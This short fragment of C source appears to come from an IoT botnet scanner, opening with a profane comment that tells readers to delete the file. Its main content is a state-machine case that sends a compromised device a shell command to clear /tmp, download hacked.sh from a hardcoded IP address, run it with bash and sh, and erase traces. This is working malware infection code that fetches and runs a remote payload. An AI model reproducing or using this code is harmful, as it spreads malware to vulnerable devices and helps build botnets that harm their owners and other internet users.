...
/* I fucking Fixed this booty ass scanner hoe 
if you're reading this fucking delete this file or i will find you.

you aint posed to have this */
			...
			case 8:
				{
					...
					if(send(fds[i].fd, "cd /tmp/ && rm -rf /tmp/* && wget http://45.63.66.75/hacked.sh -O /tmp/hacked.sh && bash /tmp/hacked.sh && sh /tmp/hacked.sh && rm -rf /tmp/* \r\n", 310, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; }
